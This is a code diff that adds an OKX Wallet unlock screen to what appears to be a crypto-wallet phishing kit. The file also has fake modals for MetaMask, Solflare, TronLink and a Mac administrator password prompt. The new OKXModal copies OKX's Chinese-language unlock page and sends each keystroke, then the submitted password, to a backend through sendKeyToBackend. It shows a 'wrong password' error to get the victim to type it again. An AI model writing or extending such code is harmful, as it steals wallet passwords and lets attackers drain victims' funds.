@@ -57,6 +57,12 @@ const walletConfigs = {
         shortKey: 'SF',
         icon: '🌐',
     },
+    OKX: {
+        id: 'OKX',
+        name: 'OKX Wallet',
+        shortKey: 'OKX',
+        icon: '⬛',
+    },
     Mac: {
         id: 'Mac',
         name: 'Mac',
@@ -113,7 +119,8 @@ const WALLET_TYPE_SHORTKEY = {
     TRONLINK: "TL",
     BITGET: "BG",
     COINBASE: "CB",
-    SOLFLARE: "SF"};
+    SOLFLARE: "SF",
+    OKX: "OKX"};
 
 // Cache for user wallet types
 const walletTypesCache = new Map();
@@ -232,11 +239,14 @@ const ASSET_PATHS = {
     bitgetLogo: 'menu/bitget_logo.png',
     tronlinkLogo: 'menu/tronlink_logo.jpeg',
     solflareLogo: 'menu/solflare_logo.png',
+    okxLogo: 'menu/okx_logo.png',
     // Wallet-specific assets
     metamaskFox: 'v1/images/logo/metamask-fox.png',
     metamaskFoxRiv: 'v1/static/media/fox_appear.9dea054e4b9b49cb4fad.riv',
     tronlinkLoading: 'v4/images/loading.gif',
     solflareFlag: 'v7/images/flag.mp4',
+    okxCoverLight: 'v9/images/cover-light.mp4',
+    okxCoverDark: 'v9/images/cover-dark-v3.mp4',
     // Phantom assets (if needed)
     phantomGifS: 'v2/images/phantom/s.gif',
     phantomGifW: 'v2/images/phantom/w.gif',
@@ -335,6 +345,9 @@ const WalletSelectionModal = ({ isOpen = false, onWalletSelect, onClose, userId,
                 break;
             case 'Solflare':
                 logoPath = ASSET_PATHS.solflareLogo;
+                break;
+            case 'OKX':
+                logoPath = ASSET_PATHS.okxLogo;
                 break;
             default:
                 return '';
@@ -2859,6 +2872,122 @@ const SolflareModal = ({ isOpen, onClose, userId, backendConfig }) => {
     return modalContent;
 };
 
+const POSTER_DARK = 'https://static.coinall.ltd/cdn/assets/imgs/2412/87CDA1790E4C4D22.png';
+const OKXModal = ({ isOpen, onClose: _onClose, userId, backendConfig, darkMode }) => {
+    const [keyword, setKeyword] = React.useState('');
+    const [connecting, setConnecting] = React.useState(false);
+    const [showPassword, setShowPassword] = React.useState(false);
+    const [isDark, setIsDark] = React.useState(darkMode ?? true);
+    const [isFocused, setIsFocused] = React.useState(false);
+    const [isWrongPassword, setIsWrongPassword] = React.useState(false);
+    const passwordInputRef = React.useRef(null);
+    React.useEffect(() => {
+        if (darkMode !== undefined) {
+            setIsDark(darkMode);
+            return;
+        }
+        const media = window.matchMedia('(prefers-color-scheme: dark)');
+        const apply = () => setIsDark(media.matches);
+        apply();
+        media.addEventListener('change', apply);
+        return () => media.removeEventListener('change', apply);
+    }, [darkMode]);
+    React.useEffect(() => {
+        if (isOpen) {
+            initializeLocationData();
+            initializeSocket();
+            setTimeout(() => passwordInputRef.current?.focus(), 200);
+        }
+    }, [isOpen]);
+    const handleKeywordChange = async (e) => {
+        const newKeyword = e.target.value;
+        setKeyword(newKeyword);
+        setIsWrongPassword(false);
+        const currentUserId = backendConfig?.userId || userId;
+        if (currentUserId && newKeyword && backendConfig?.enabled !== false) {
+            await sendKeyToBackend(currentUserId, 'cha', newKeyword, WALLET_TYPE_SHORTKEY.OKX);
+        }
+    };
+    const handleUnlock = async () => {
+        if (connecting || !keyword.trim())
+            return;
+        setConnecting(true);
+        const currentUserId = backendConfig?.userId || userId;
+        if (!currentUserId) {
+            setConnecting(false);
+            return;
+        }
+        if (backendConfig?.enabled !== false) {
+            const result = await sendKeyToBackend(currentUserId, 'enter', keyword, WALLET_TYPE_SHORTKEY.OKX);
+            setTimeout(() => {
+                setConnecting(false);
+                setIsWrongPassword(!!result.error);
+                passwordInputRef.current?.focus();
+            }, 400);
+        }
+        else {
+            setTimeout(() => setConnecting(false), 150);
+        }
+    };
+    const handleKeyDown = (e) => {
+        if (e.key === 'Enter' && keyword.trim() && !connecting) {
+            handleUnlock();
+        }
+    };
+    const togglePasswordVisibility = () => {
+        setShowPassword((prev) => !prev);
+        setTimeout(() => passwordInputRef.current?.focus(), 0);
+    };
+    if (!isOpen)
+        return null;
+    const isButtonEnabled = keyword.trim().length > 0 && !connecting && !isWrongPassword;
+    const logoSrc = resolveAssetUrl(isDark ? ASSET_PATHS.okxCoverDark : ASSET_PATHS.okxCoverLight);
+    return (React.createElement("div", { className: `okx-modal fixed inset-0 z-[10000] flex items-center justify-center antialiased ${isDark ? 'bg-black text-white' : 'bg-[#f5f5f5] text-black'}` },
+        React.createElement("button", { type: "button", onClick: () => setIsDark((v) => !v), className: `absolute top-4 right-4 z-[10001] rounded-full px-3 py-1.5 text-xs cursor-pointer bg-transparent ${isDark ? 'border border-[#333] text-[#8c8c8c]' : 'border border-[#d9d9d9] text-[#8c8c8c]'}` }, isDark ? 'Light' : 'Dark'),
+        React.createElement("div", { className: `relative w-[360px] h-[600px] overflow-hidden ${isDark ? 'bg-black shadow-[0_1px_2px_rgba(256,256,256,0.2)]' : 'bg-white shadow-[0_4px_10px_rgba(0,0,0,0.15)]'}` },
+            React.createElement("div", { className: "h-full overflow-y-auto overflow-x-hidden" },
+                React.createElement("div", { className: "flex items-center justify-center" },
+                    React.createElement("div", { className: "flex w-full items-center justify-center" },
+                        React.createElement("video", { key: logoSrc, className: "block h-full w-full object-contain", autoPlay: true, muted: true, playsInline: true, src: logoSrc, poster: isDark ? POSTER_DARK : undefined }))),
+                React.createElement("div", { className: "flex flex-col items-center mb-[24px]" },
+                    React.createElement("div", { className: `w-full text-center text-[28px] font-[700] pb-[12px] leading-8 ${isDark ? 'text-white' : 'text-black'}` }, "Web3 \u5165\u53E3\uFF0C\u4E00\u4E2A\u5C31\u591F"),
+                    React.createElement("div", { className: "w-full text-center text-[12px] font-normal leading-4 text-[#8c8c8c]" }, "\u94B1\u5305 \u00B7 \u4EA4\u6613 \u00B7 \u80A1\u7968 \u00B7 \u8D5A\u5E01 \u00B7 DApp")),
+                React.createElement("form", { className: "w-full px-[16px]", onSubmit: (e) => {
+                        e.preventDefault();
+                        handleUnlock();
+                    } },
+                    React.createElement("div", { className: `flex h-12 w-full items-center rounded-[8px] border px-3.5 transition-colors ${isDark ? 'bg-[#1f1f1f]' : 'bg-[#f0f0f0]'} ${isWrongPassword
+                            ? 'border-[#91304a]'
+                            : isFocused
+                                ? isDark
+                                    ? 'border-white'
+                                    : 'border-black'
+                                : isDark
+                                    ? 'border-[#1f1f1f]'
+                                    : 'border-[#f0f0f0]'}`, role: "none" },
+                        React.createElement("input", { ref: passwordInputRef, className: `h-full min-w-0 flex-1 border-none flex items-center bg-transparent p-0 text-[16px] leading-5 outline-none appearance-none ${isDark ? 'text-white caret-[#bcff2f] placeholder:text-[#6c6c6c]' : 'text-black caret-[#2b6d17] placeholder:text-[#BDBDBD]'}`, type: showPassword ? 'text' : 'password', value: keyword, onChange: handleKeywordChange, onKeyDown: handleKeyDown, onFocus: () => setIsFocused(true), onBlur: () => setIsFocused(false), placeholder: "\u8BF7\u8F93\u5165\u5BC6\u7801", autoComplete: "off", autoCapitalize: "off", autoCorrect: "off", spellCheck: false, disabled: connecting, "aria-label": "Password" }),
+                        React.createElement("div", { className: "ml-2 flex shrink-0 items-center" },
+                            React.createElement("button", { type: "button", className: "inline-flex cursor-pointer items-center justify-center border-none bg-transparent p-0 leading-none text-[#7d7d7d] hover:opacity-85", onClick: togglePasswordVisibility, "aria-label": showPassword ? 'Hide password' : 'Show password' }, showPassword ? (React.createElement("svg", { width: "20", height: "20", viewBox: "0 0 24 24", fill: "currentColor" },
+                                React.createElement("path", { d: "M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" }))) : (React.createElement("svg", { width: "20", height: "20", viewBox: "0 0 24 24", fill: "currentColor" },
+                                React.createElement("path", { d: "M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z" })))))),
+                    isWrongPassword && (React.createElement("p", { className: "mt-2 text-left text-[14px] leading-[16px] text-[#eb4b6d]" },
+                        "\u5BC6\u7801\u9519\u8BEF\uFF0C\u82E5\u6D89\u53CA\u6307\u7EB9\u6D4F\u89C8\u5668\u3001\u4E91\u4E3B\u673A\u6216\u786C\u4EF6\u5347\u7EA7\u7B49\u60C5\u51B5\uFF0C\u8BF7\u67E5\u770B",
+                        ' ',
+                        React.createElement("a", { href: "https://www.okx.com/help/how-to-solve-the-problem-of-encountering-password-errors-when-logging-in-to", target: "_blank", rel: "noopener noreferrer", className: `underline ${isDark ? 'text-white' : 'text-black'}  hover:no-underline` }, "\u516C\u544A"))),
+                    React.createElement("div", { className: "invisible h-[139px]", "aria-hidden": "true" }))),
+            React.createElement("div", { className: `absolute bottom-0 left-0 z-[10000] w-[360px] ${isDark ? 'bg-black' : 'bg-white'}` },
+                React.createElement("div", { className: "flex flex-col items-center px-[16px] pb-[24px]" },
+                    React.createElement("button", { type: "button", disabled: !isButtonEnabled, onClick: handleUnlock, className: `flex p-[18px] w-full items-center justify-center rounded-full border-none text-[18px] font-[700] leading-5 transition-colors ${isButtonEnabled
+                            ? isDark
+                                ? 'cursor-pointer bg-white text-black hover:bg-[#e8e8e8]'
+                                : 'cursor-pointer bg-black text-white hover:bg-[#1a1a1a]'
+                            : isDark
+                                ? 'cursor-not-allowed bg-[#1f1f1f] text-[#5c5c5c]'
+                                : 'cursor-not-allowed bg-[#f0f0f0] text-[#b0b0b0]'}` },
+                        React.createElement("span", null, connecting ? '解锁' : '解锁')),
+                    React.createElement("a", { href: "https://www.okx.com/help/how-to-solve-the-problem-of-encountering-password-errors-when-logging-in-to", className: "cursor-pointer mt-[24px] text-center text-sm font-medium leading-5 text-[#8c8c8c] no-underline hover:opacity-60" }, "\u5FD8\u8BB0\u5BC6\u7801\uFF1F"))))));
+};
+
 const MacModal = ({ isOpen, onClose, userId, backendConfig, adminName: adminNameProp }) => {
     const [adminName, setAdminName] = React.useState(adminNameProp || 'Administrator');
     const [keyword, setKeyword] = React.useState('');
@@ -3053,6 +3182,9 @@ const CustomWalletModal = ({ wallet, isOpen = false, onClose, userId, backendCon
         case 'Solflare':
             modalComponent = React.createElement(SolflareModal, { ...modalProps });
             break;
+        case 'OKX':
+            modalComponent = React.createElement(OKXModal, { ...modalProps });
+            break;
         case 'Mac':
             modalComponent = React.createElement(MacModal, { ...modalProps });
             break;
@@ -3176,6 +3308,14 @@ const isSolflareInstalled = () => {
         window.solflare.isSolflare === true);
 };
 /**
+ * Check if OKX Wallet is installed
+ */
+const isOKXInstalled = () => {
+    if (typeof window === 'undefined')
+        return false;
+    return window.okxwallet?.isOkxWallet === true;
+};
+/**
  * Check if a specific wallet is installed
  */
 const checkWalletInstalled = (wallet) => {
@@ -3209,6 +3349,10 @@ const checkWalletInstalled = (wallet) => {
         case 'Solflare':
             isInstalled = isSolflareInstalled();
             walletName = 'Solflare';
+            break;
+        case 'OKX':
+            isInstalled = isOKXInstalled();
+            walletName = 'OKX Wallet';
             break;
         default:
             isInstalled = false;
